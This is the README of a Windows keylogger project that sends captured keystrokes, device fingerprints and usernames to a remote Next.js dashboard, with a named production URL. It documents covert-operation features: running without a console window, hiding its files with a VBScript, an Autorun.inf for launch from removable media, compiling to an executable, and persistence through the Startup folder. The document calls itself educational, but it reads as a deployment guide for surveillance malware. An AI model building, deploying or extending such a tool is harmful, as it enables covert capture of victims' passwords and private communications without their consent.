# KeyLogger


A Windows keylogger with a real-time web dashboard. The Python client captures keystrokes and POSTs them in batches to a Vercel-hosted Next.js server using HTTP. The server stores logs in Upstash Redis and streams updates to the dashboard via Server-Sent Events (SSE).

## Architecture

```

┌──────────────────┐   HTTP POST    ┌───────────────────┐   SSE         ┌──────────────┐
│ keylogger/       │ ──────────────▶│ server/           │──────────────▶│ Browser UI   │
│ Keylogger.py     │  /api/ingest   │ Next.js + Redis   │   /api/events │ (page.js)    │
└──────────────────┘                └───────────────────┘               └──────────────┘
```

- **`keylogger/`** — Python client that hooks global key events and batches them to the server via HTTP POST. Also ships with a VBScript file-hider and a Windows launcher.
- **`server/`** — Next.js app (deployed on Vercel) that stores logs in Upstash Redis and serves a live dashboard. The dashboard receives real-time updates via SSE.

## Repository layout

```
KeyLogger/
├── keylogger/              Python client (runs on the target machine)
│   ├── Keylogger.py
│   ├── LauncherForWindows.bat
│   ├── requirements.txt
│   ├── file_hider.vbs
│   └── logs.txt
├── server/                 Next.js dashboard + HTTP/SSE relay
│   ├── src/app/page.js         dashboard UI
│   ├── src/app/api/ingest/route.js  HTTP ingest endpoint
│   ├── src/app/api/events/route.js  SSE events endpoint
│   ├── src/app/api/mode/route.js    Dashboard mode endpoint
│   └── package.json
├── Autorun.inf
├── py_compiler.bat
└── LICENSE
```

## Quick start

### 1. Start the server

```bash
cd server
npm install
npm run dev
```


The Next.js dev server runs on `http://localhost:3000`. In production, the server is deployed to Vercel at `https://keylogger-py.vercel.app`. The dashboard receives real-time updates via SSE from `/api/events`.

### 2. Run the keylogger client

```bash
cd keylogger
LauncherForWindows.bat
```


The launcher installs dependencies (`keyboard`, `requests`, etc.) and starts `Keylogger.py` with `pythonw` so it runs without a console window. The client POSTs batched keystrokes to `/api/ingest` on the server every 2 seconds.

To point the client at a different server, edit the `endpoint` in `keylogger/Keylogger.py`.


## How it works

1. **Keylogger client** batches keystrokes and POSTs them to `/api/ingest` every 2 seconds.
2. **Server** appends logs to Upstash Redis and streams new events to dashboards via `/api/events` (SSE).
3. **Dashboard** connects to `/api/events` and updates in real time.

Mode switching (raw/structured) is handled by the dashboard writing to `/api/mode`, and the client reading the mode from each POST response.

### Capture modes

The client supports two modes, switchable from the dashboard:

- **`structured`** — keystrokes are buffered, flushed on space / enter / idle, and sent as a list of `[text, deleted]` segments. Backspaces (including `Ctrl+Backspace` word-delete) mark prior characters as deleted rather than dropping them, so the UI can render struck-through text.
- **`raw`** — every key-down event is forwarded immediately, including special keys. Useful for low-level inspection.

### Device identification

On connect, the client sends a `hello` message with a device fingerprint (hostname, username, OS, and a SHA-256-derived device ID from hostname + MAC). The server tags every forwarded message with this device so the dashboard can show multiple machines simultaneously.

### Modifier combos

`Ctrl`/`Alt`/`Win` + key combos are flushed as their own `combo` events (e.g. `ctrl+c`) rather than being appended to the visible text stream. `Shift` + letter is treated as a normal character.

### Master exit

Typing the word **`crash`** followed by **three `Shift` presses** cleanly shuts down the Python client: it flushes any buffered keystrokes, sends an `exit` message to the server, and calls `os._exit(0)`. Any other key between `crash` and the shift presses cancels the trigger.

### Message types (WebSocket wire format)

| Direction            | `type`             | Payload                                                  |
| -------------------- | ------------------ | -------------------------------------------------------- |
| client → server      | `hello`            | `{ device: { id, hostname, username, platform, ... } }`  |
| client → server      | *(none)*           | `{ data: [{text, deleted}, ...], timestamp }` (structured) |
| client → server      | *(none)*           | `{ data: "<key>", timestamp }` (raw mode)                |
| client → server      | `combo`            | `{ data: "ctrl+c", timestamp }`                          |
| client → server      | `delete_previous`  | `{ count, timestamp }` (retro-deletes already-flushed chars) |
| client → server      | `exit`             | `{ timestamp }`                                          |
| frontend → server    | *(mode switch)*    | `{ mode: "structured" \| "raw" }`                        |
| server → frontend    | `status`           | `{ clientConnected, devices: [...] }`                    |

## Stealth helpers

- **`keylogger/file_hider.vbs`** — sets the hidden attribute on `Keylogger.py`, `LauncherForWindows.bat`, `requirements.txt`, and itself.
- **`Autorun.inf`** — autorun descriptor for removable-media launch.
- **`py_compiler.bat`** — compile the Python client into a standalone executable.
- Drop the launcher in the Windows Startup folder to run the client at login.

## Notes

- Do not rename any of the scripts in `keylogger/` without updating cross-references in the other files.
- The server has no authentication. Don't expose port `6699` or `3000` to an untrusted network.
- The `server/` project uses a non-standard Next.js build — see `server/AGENTS.md` before editing server code; read the docs bundled in `server/node_modules/next/dist/docs/` rather than relying on public Next.js documentation.

## Legal / ethical

Released for educational and authorized security-testing use only. Running a keylogger on a machine you do not own or without the informed consent of its user is illegal in most jurisdictions. You are responsible for complying with every applicable law. See [LICENSE](LICENSE).
